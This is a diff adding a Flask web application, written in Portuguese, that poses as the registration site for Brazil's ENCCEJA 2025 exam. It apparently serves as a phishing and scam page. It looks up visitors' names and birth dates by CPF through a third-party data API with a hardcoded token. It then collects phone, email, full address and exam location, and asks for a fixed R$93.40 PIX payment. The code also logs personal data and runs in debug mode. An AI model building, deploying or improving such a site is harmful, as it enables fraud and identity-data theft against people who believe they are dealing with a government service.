@@ -1,0 +1,339 @@
+from flask import Flask, render_template, request, session, redirect, url_for, jsonify
+import os
+import logging
+import requests
+import re
+from dotenv import load_dotenv
+
+# Carregar variáveis de ambiente
+load_dotenv()
+
+app = Flask(__name__)
+app.secret_key = os.environ.get("SESSION_SECRET", "encceja_secret_2025")
+
+# Configurar logging
+logging.basicConfig(level=logging.INFO)
+
+def consultar_cpf_api(cpf: str) -> dict:
+    """
+    Consulta CPF na API externa corrigida para VPS
+    """
+    try:
+        # API de consulta CPF com estrutura corrigida
+        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
+        url = f"https://consulta.fontesderenda.blog/cpf.php?token={token}&cpf={cpf}"
+        
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'Accept': 'application/json, text/plain, */*',
+            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
+            'Connection': 'keep-alive'
+        }
+        
+        response = requests.get(url, headers=headers, timeout=15)
+        
+        if response.status_code == 200:
+            data = response.json()
+            app.logger.info(f"[PROD] Resposta da API: {data}")
+            
+            # A API retorna dados na estrutura {'DADOS': {...}}
+            if data.get("DADOS"):
+                dados = data["DADOS"]
+                app.logger.info(f"[PROD] CPF consultado com sucesso na API: {cpf}")
+                return {
+                    'sucesso': True,
+                    'nome': dados.get('nome', ''),
+                    'cpf': cpf,
+                    'situacao': 'REGULAR',
+                    'data_nascimento': dados.get('data_nascimento', '').split(' ')[0] if dados.get('data_nascimento') else '',
+                    'telefone': '',
+                    'email': ''
+                }
+            else:
+                app.logger.warning(f"[PROD] CPF não encontrado na API: {cpf}")
+                return {'sucesso': False, 'erro': 'CPF não encontrado'}
+        
+        app.logger.error(f"[PROD] Erro HTTP na API de CPF: {response.status_code}")
+        return {'sucesso': False, 'erro': 'Erro na consulta'}
+        
+    except Exception as e:
+        app.logger.error(f"[PROD] Erro ao consultar CPF: {e}")
+        return {'sucesso': False, 'erro': 'Erro interno'}
+
+@app.route('/')
+def index():
+    """Página principal - redireciona para /inscricao"""
+    return redirect(url_for('inscricao'))
+
+@app.route('/inscricao')
+def inscricao():
+    """Página principal de inscrição ENCCEJA"""
+    user_data = session.get('user_data', {'nome': '', 'cpf': '', 'phone': ''})
+    app.logger.info(f"[PROD] Renderizando página de inscrição para: {user_data}")
+    
+    return render_template('inscricao.html', user_data=user_data)
+
+@app.route('/consultar-cpf-inscricao')
+def consultar_cpf_inscricao():
+    """API para consultar CPF (para a página de inscrição)"""
+    cpf = request.args.get('cpf')
+    if not cpf:
+        return jsonify({"error": "CPF não fornecido", "sucesso": False}), 400
+    
+    try:
+        # Formatar o CPF (remover pontos e traços se houver)
+        cpf_numerico = cpf.replace('.', '').replace('-', '')
+        
+        # Consultar na API
+        resultado = consultar_cpf_api(cpf_numerico)
+        
+        if resultado.get('sucesso'):
+            # Converter para formato esperado pelo frontend
+            user_data = {
+                'cpf': resultado.get('cpf', cpf_numerico),
+                'nome': resultado.get('nome', ''),
+                'dataNascimento': resultado.get('data_nascimento', ''),
+                'situacaoCadastral': "REGULAR",
+                'telefone': '',
+                'email': '',
+                'sucesso': True
+            }
+            
+            # Salvar dados na sessão
+            session['user_data'] = user_data
+            return jsonify(user_data)
+        else:
+            return jsonify({"error": "CPF não encontrado na base de dados", "sucesso": False}), 404
+    
+    except Exception as e:
+        app.logger.error(f"Erro ao processar consulta CPF: {e}")
+        return jsonify({"error": f"Erro ao buscar CPF: {str(e)}", "sucesso": False}), 500
+
+@app.route('/encceja-info', methods=['GET', 'POST'])
+def encceja_info():
+    """Página de dados encontrados"""
+    user_data = session.get('user_data', {})
+    
+    if not user_data.get('sucesso'):
+        return redirect(url_for('inscricao'))
+    
+    return render_template('encceja_info.html', user_data=user_data)
+
+@app.route('/validar-dados', methods=['GET', 'POST'])
+def validar_dados():
+    """Página de validação de dados"""
+    user_data = session.get('user_data', {})
+    
+    if not user_data.get('cpf'):
+        return redirect(url_for('inscricao'))
+    
+    if request.method == 'POST':
+        # Atualizar dados do usuário
+        user_data.update({
+            'telefone': request.form.get('telefone', ''),
+            'email': request.form.get('email', ''),
+            'endereco': request.form.get('endereco', ''),
+            'cidade': request.form.get('cidade', ''),
+            'estado': request.form.get('estado', '')
+        })
+        session['user_data'] = user_data
+        return redirect(url_for('endereco'))
+    
+    return render_template('validar_dados.html', user_data=user_data)
+
+@app.route('/endereco', methods=['GET', 'POST'])
+def endereco():
+    """Página de coleta de endereço"""
+    user_data = session.get('user_data', {})
+    
+    if not user_data.get('cpf'):
+        return redirect(url_for('inscricao'))
+    
+    if request.method == 'POST':
+        # Atualizar dados do usuário com endereço
+        user_data.update({
+            'cep': request.form.get('cep', ''),
+            'logradouro': request.form.get('logradouro', ''),
+            'numero': request.form.get('numero', ''),
+            'complemento': request.form.get('complemento', ''),
+            'bairro': request.form.get('bairro', ''),
+            'cidade': request.form.get('cidade', ''),
+            'estado': request.form.get('estado', ''),
+            'telefone': request.form.get('telefone', ''),
+            'email': request.form.get('email', '')
+        })
+        session['user_data'] = user_data
+        return redirect(url_for('local_prova'))
+    
+    return render_template('endereco.html', user_data=user_data)
+
+@app.route('/local-prova', methods=['GET', 'POST'])
+def local_prova():
+    """Página de seleção do local de prova"""
+    user_data = session.get('user_data', {})
+    
+    if not user_data.get('cpf'):
+        return redirect(url_for('inscricao'))
+    
+    if request.method == 'POST':
+        # Atualizar dados do usuário com local de prova
+        user_data.update({
+            'local_prova': request.form.get('local_prova', ''),
+            'cidade_prova': request.form.get('cidade_prova', ''),
+            'estado_prova': request.form.get('estado_prova', '')
+        })
+        session['user_data'] = user_data
+        return redirect(url_for('pagamento'))
+    
+    return render_template('local_prova.html', user_data=user_data)
+
+@app.route('/pagamento')
+def pagamento():
+    """Página de pagamento PIX"""
+    user_data = session.get('user_data', {})
+    
+    if not user_data.get('cpf'):
+        return redirect(url_for('inscricao'))
+    
+    return render_template('pagamento.html', user_data=user_data)
+
+@app.route('/criar-pagamento-pix', methods=['POST'])
+def criar_pagamento_pix():
+    """Criar pagamento PIX via WitePay - Versão VPS corrigida"""
+    try:
+        # Importar função do gateway corrigido
+        from witepay_gateway import create_witepay_payment
+        
+        # Valor fixo do ENCCEJA
+        amount = 93.40
+        description = "Inscrição ENCCEJA 2025"
+        
+        app.logger.info(f"Iniciando criação de pagamento PIX - R$ {amount:.2f}")
+        
+        # Criar pagamento
+        result = create_witepay_payment(amount, description)
+        
+        if result.get('success'):
+            # Salvar dados do pagamento na sessão
+            session['payment_data'] = result
+            
+            app.logger.info(f"Pagamento PIX criado com sucesso - ID: {result.get('transaction_id')}")
+            
+            return jsonify({
+                'success': True,
+                'transaction_id': result.get('transaction_id'),
+                'pix_code': result.get('pix_code'),
+                'qr_code': result.get('qr_code'),
+                'amount': result.get('amount'),
+                'order_id': result.get('order_id')
+            })
+        else:
+            error_msg = result.get('error', 'Erro desconhecido')
+            app.logger.error(f"Erro ao criar pagamento PIX: {error_msg}")
+            return jsonify({
+                'success': False,
+                'error': error_msg
+            }), 400
+    
+    except ImportError as e:
+        app.logger.error(f"Erro ao importar gateway: {e}")
+        return jsonify({
+            'success': False,
+            'error': 'Gateway de pagamento não disponível'
+        }), 500
+    except Exception as e:
+        app.logger.error(f"Erro inesperado ao criar pagamento: {e}")
+        return jsonify({
+            'success': False,
+            'error': f'Erro interno: {str(e)}'
+        }), 500
+
+@app.route('/verificar-pagamento/<transaction_id>')
+def verificar_pagamento(transaction_id):
+    """Verificar status do pagamento"""
+    try:
+        from witepay_gateway import check_payment_status
+        
+        result = check_payment_status(transaction_id)
+        return jsonify(result)
+    
+    except Exception as e:
+        app.logger.error(f"Erro ao verificar pagamento: {e}")
+        return jsonify({
+            'status': 'pending',
+            'paid': False
+        })
+
+@app.route('/witepay-postback', methods=['POST'])
+def witepay_postback():
+    """Receber notificações do WitePay"""
+    try:
+        data = request.get_json()
+        app.logger.info(f"Postback recebido: {data}")
+        
+        # Processar postback
+        status = data.get('status', '').upper()
+        if status in ['PAID', 'COMPLETED', 'APPROVED']:
+            app.logger.info("Pagamento confirmado via postback")
+        
+        return jsonify({'status': 'ok'})
+    
+    except Exception as e:
+        app.logger.error(f"Erro no postback: {e}")
+        return jsonify({'status': 'error'})
+
+@app.route('/inscricao-sucesso')
+def inscricao_sucesso():
+    """Página de sucesso da inscrição"""
+    user_data = session.get('user_data', {})
+    return render_template('inscricao_sucesso.html', user_data=user_data)
+
+@app.route('/obrigado')
+def obrigado():
+    """Página de agradecimento"""
+    user_data = session.get('user_data', {})
+    return render_template('inscricao_sucesso.html', user_data=user_data)
+
+@app.route('/aviso')
+def aviso():
+    """Página de aviso"""
+    user_data = session.get('user_data', {})
+    return render_template('aviso.html', user_data=user_data)
+
+# Rotas de compatibilidade
+@app.route('/index')
+def index_redirect():
+    return redirect(url_for('inscricao'))
+
+@app.route('/encceja')
+def encceja():
+    return redirect(url_for('inscricao'))
+
+# Rota para API do ViaCEP (busca de endereço por CEP)
+@app.route('/api/cep/<cep>')
+def buscar_cep(cep):
+    """Buscar endereço por CEP usando ViaCEP"""
+    try:
+        import requests
+        response = requests.get(f'https://viacep.com.br/ws/{cep}/json/', timeout=10)
+        
+        if response.status_code == 200:
+            data = response.json()
+            if 'erro' not in data:
+                return jsonify({
+                    'success': True,
+                    'logradouro': data.get('logradouro', ''),
+                    'bairro': data.get('bairro', ''),
+                    'cidade': data.get('localidade', ''),
+                    'estado': data.get('uf', ''),
+                    'cep': data.get('cep', '')
+                })
+        
+        return jsonify({'success': False, 'error': 'CEP não encontrado'})
+    
+    except Exception as e:
+        app.logger.error(f"Erro ao buscar CEP: {e}")
+        return jsonify({'success': False, 'error': 'Erro na consulta do CEP'})
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=True)
